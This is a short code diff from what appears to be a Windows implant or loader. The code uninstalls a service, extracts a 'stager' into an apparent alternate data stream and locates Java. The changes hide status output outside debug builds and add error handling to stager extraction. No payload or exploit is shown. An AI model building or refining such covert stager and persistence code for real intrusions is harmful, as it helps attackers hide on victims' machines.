@@ -249,9 +249,11 @@ void UnInstall(){
 		} else	{
 
 			if(!DeleteService(schService)) {
-				printf_s("Failed to delete service %s\n", serviceName);
+#ifdef _DBG
+				printf_s("Failed to delete service %s\n", serviceName.c_str());
 			} else {
-				printf_s("Service %s removed\n",serviceName);
+				printf_s("Service %s removed\n", serviceName.c_str());
+#endif
 			}
 			CloseServiceHandle(schService); 
 		}
@@ -384,7 +386,9 @@ DWORD WINAPI InvokeMainWrapper(LPVOID lpParam ) {
 #ifdef _DBG
 		Log( "Stager doesn't exist, extracting from binary.\r\n");
 #endif
-		ExtractStager( adsPath );
+		if ( !ExtractStager(adsPath)) {
+			return 1;
+		}
 	}
 
 	//Get Java path
